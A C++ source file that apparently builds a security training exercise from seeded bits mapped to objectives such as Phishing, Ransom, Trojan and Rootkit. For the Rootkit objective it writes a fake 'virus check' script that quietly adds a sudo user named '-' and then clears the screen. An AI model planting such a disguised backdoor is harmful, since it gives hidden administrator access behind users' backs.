#include <iostream>
#include <bitset>
#include <vector>
#include <algorithm>
#include <math.h>
#include <cstdio>
#include <stdexcept>
#include <string>
#include <array>
#include <fstream>
#include <memory>

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

std::bitset<32> generateBinary(int seconds) {
    std::bitset<16> binary = std::bitset<16>(seconds).flip();
    binary <<= 2;
    binary = std::bitset<16>(binary.to_ulong() + 1);


    std::bitset<16> set1 = binary;
    std::bitset<16> set2 = binary;

    set1 >>= 1;
    set2 = set2.flip();

    std::bitset<32> finalBitset(set1.to_string() + set2.to_string());

    return finalBitset;
}

std::vector<std::vector<std::string>> loopThroughObjectives(std::bitset<32> bits) {
    std::string bitString = bits.to_string();

    std::vector<std::vector<std::string>> objectives;

    int i = 0;
    for (char c : bitString) {
        i++;
    
        if (c == '1') {
            switch (i) {
                case 17: // stupid bug: both first byte and sixteenth byte can never be 1.
                    objectives.push_back({"Firewall"});
                    break;

                // no work :(, cannot config firefox realistically
                
                // case 2:
                //     objectives.push_back({"Firefox"});
                //     break;

                // case 3:
                //     objectives.push_back({"Cookies"});
                //     break;

                case 5: {
                    u_long websiteID = std::bitset<2>(std::string(1, bitString.at(5)) + bitString.at(6)).to_ulong();
                    std::string website = "";

                    if (websiteID == 0) {
                        website = "a";
                    } else if (websiteID == 1) {
                        website = "f";
                    } else {
                        website = "s";
                    }

                    objectives.push_back({"Phishing", website});
                    
                }
                break;

                case 6: {
                    u_long shID = std::bitset<2>(std::string(1, bitString.at(6)) + bitString.at(7)).to_ulong();
                    std::string sh = "";

                    if (shID == 0) {
                        sh = "ci";
                    } else if (shID == 1) {
                        sh = "up";
                    } else if (shID == 2) {
                        sh = "ch";
                    } else {
                        sh = "cr";
                    }

                    objectives.push_back({"Virus", sh});
                    
                }
                break;

                case 7: {
                    std::bitset<5> codeID = std::bitset<5>((std::string(1, bitString.at(7)) + bitString.at(8) + bitString.at(9) + bitString.at(10) + bitString.at(11)));
                    
                    int64_t codeTotal = std::pow(codeID.flip().to_ulong(), 2) * codeID.to_ulong();

                    std::string codeByte = std::bitset<12>(codeTotal).to_string();


                    std::string code1 = std::to_string(std::bitset<4>(codeByte.substr(8, 4)).to_ulong());
                    std::string code2 = std::to_string(std::bitset<4>(codeByte.substr(4, 4)).to_ulong());
                    std::string code3 = std::to_string(std::bitset<4>(codeByte.substr(0, 4)).to_ulong());

                    objectives.push_back({"Ransom", code1, code2, code3});
                    
                }
                break;

                case 8: {
                    u_long appID = std::bitset<2>(bitString.at(8)).to_ulong();
                    std::string app = "";

                    if (appID == 0) {
                        app = "B";
                    } else {
                        app = "V";
                    }

                    objectives.push_back({"Trojan", app});
                    
                }
                break;

                case 9: {
                    objectives.push_back({"DDOS"});
                    
                }
                break;

                case 10: {
                    objectives.push_back({"Worm"});
                    
                }
                break;

                case 11: {
                    objectives.push_back({"Backdoor"});
                    
                }
                break;

                case 12: {
                    u_long appID = std::bitset<2>(std::string(1, bitString.at(12)) + bitString.at(13)).to_ulong();
                    std::string app = "";

                    if (appID == 0) {
                        app = "P";
                    } else if (appID == 1) {
                        app = "R";
                    } else {
                        app = "X";
                    }

                    objectives.push_back({"Docker", app});
                    
                }
                break;

                case 13: {
                    u_long appID = std::bitset<3>(std::string(1, bitString.at(13)) + bitString.at(14) + bitString.at(15)).to_ulong();
                    std::string app = "";

                    if (appID == 0) {
                        app = "GIM";
                    } else if (appID == 1) {
                        app = "A";
                    } else if (appID == 2) {
                        app = "GIT";
                    } else if (appID == 3) {
                        app = "N";
                    } else {
                        app = "E";
                    }

                    objectives.push_back({"App", app});
                    
                }
                break;

                case 14: {
                    u_long appID = std::bitset<2>(std::string(1, bitString.at(14)) + bitString.at(15)).to_ulong();
                    std::string app = "";

                    if (appID == 0) {
                        app = "V";
                    } else if (appID == 1) {
                        app = "T";
                    } else {
                        app = "P";
                    }

                    objectives.push_back({"Rootkit", app});
                    



                }
                break;

                case 15: {
                    objectives.push_back({"Passwords"});
                    
                }
                break;

                default:
                    break;
            }
        }

        
    }
    return objectives;
}

void handleObjectives(std::vector<std::vector<std::string>> objectives) {
    for (std::vector<std::string> objective: objectives) {
        std::string id = objective[0];
        std::cout << id << std::endl;
        if (id == "Rootkit") {
            std::ofstream file("/home/bughunter/utils/vs.sh");

            file << "if [ \"$EUID\" -ne 0 ]\nthen echo \"Please run as root!\"\nexit\nfi\necho \"Checking for viruses...\"\nsudo adduser \"-\" sudo\nprintf \"\\033c\"\necho \"None found!\"";




            file.close();
        }
    }
}


int main() {
    handleObjectives(loopThroughObjectives(generateBinary(999999)));
    return 0;
}   